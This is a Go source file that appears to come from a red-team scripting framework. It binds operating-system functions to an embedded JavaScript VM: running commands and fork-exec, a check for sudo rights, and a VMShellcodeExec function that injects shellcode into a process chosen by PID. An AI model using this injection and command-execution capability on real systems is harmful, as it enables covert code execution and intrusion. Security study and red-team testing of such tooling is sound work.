package engine

import (
	"os/exec"

	"github.com/robertkrimen/otto"
)

func (e *Engine) VMExec(call otto.FunctionCall) otto.Value {
	baseCmd, err := call.Argument(0).ToString()
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("Parameter parsing error: %s", err.Error())
		return otto.FalseValue()
	}
	cmdArgs := call.Argument(1)
	argList := []string{}
	if !cmdArgs.IsNull() {
		argArray, err := cmdArgs.Export()
		if err != nil {
			e.Logger.WithField("trace", "true").Errorf("Parameter parsing error: %s", err.Error())
			return otto.FalseValue()
		}
		argList = argArray.([]string)
	}
	cmdOutput := ExecuteCommand(baseCmd, argList...)
	vmResponse, err := e.VM.ToValue(cmdOutput)
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("Return value casting error: %s", err.Error())
		return otto.FalseValue()
	}
	return vmResponse
}

func (e *Engine) VMShellcodeExec(call otto.FunctionCall) otto.Value {
	shellcode, err := call.Argument(0).ToString()
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("Parameter parsing error: %s", err.Error())
		return otto.FalseValue()
	}

	pid, err := call.Argument(1).ToInteger()
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("Parameter parsing error: %s", err.Error())
		return otto.FalseValue()
	}

	err = InjectIntoProc(shellcode, pid)
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("Injection error: %s", err.Error())
		return otto.FalseValue()
	}
	return otto.TrueValue()
}

func (e *Engine) VMForkExec(call otto.FunctionCall) otto.Value {
	baseCmd, err := call.Argument(0).ToString()
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("Parameter parsing error: %s", err.Error())
		return otto.FalseValue()
	}
	cmdArgs := call.Argument(1)
	argList := []string{}
	if !cmdArgs.IsNull() {
		argArray, err := cmdArgs.Export()
		if err != nil {
			e.Logger.WithField("trace", "true").Errorf("Parameter parsing error: %s", err.Error())
			return otto.FalseValue()
		}
		argList = argArray.([]string)
	}
	_, err = ForkExecuteCommand(baseCmd, argList...)
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("OS error: %s", err.Error())
		return otto.FalseValue()
	}
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("Return value casting error: %s", err.Error())
		return otto.FalseValue()
	}
	return otto.TrueValue()
}

func (e *Engine) VMCmdSuccessful(call otto.FunctionCall) otto.Value {
	cmd := call.Argument(0)
	cmdString, err := cmd.Export()
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("Parameter parsing error: %s", err.Error())
		return otto.FalseValue()
	}
	arg := call.Argument(1)
	argString, err := arg.Export()
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("Parameter parsing error: %s", err.Error())
		return otto.FalseValue()
	}
	resp := ExecuteCommand(cmdString.(string), argString.(string))
	if resp.Success == false {
		e.Logger.WithField("trace", "true").Errorf("OS error: %s", resp.ErrorMsg)
		return otto.FalseValue()
	} else if resp.Success == true {
		return otto.TrueValue()
	}
	return otto.FalseValue()
}

func (e *Engine) VMCanSudo(call otto.FunctionCall) otto.Value {
	resp := ExecuteCommand("sudo", "-v")
	if resp.Success == false {
		e.Logger.WithField("trace", "true").Errorf("OS error: %s", resp.ErrorMsg)
		return otto.FalseValue()
	} else if resp.Success == true {
		return otto.TrueValue()
	}
	return otto.FalseValue()
}

func (e *Engine) VMExistsInPath(call otto.FunctionCall) otto.Value {
	cmd := call.Argument(0)
	cmdString, err := cmd.Export()
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("Parameter parsing error: %s", err.Error())
		return otto.FalseValue()
	}
	path, err := exec.LookPath(cmdString.(string))
	if err != nil {
		e.Logger.WithField("trace", "true").Errorf("OS error: %s", err.Error())
		return otto.FalseValue()
	} else if path != "" {
		return otto.TrueValue()
	} else {
		return otto.FalseValue()
	}
}
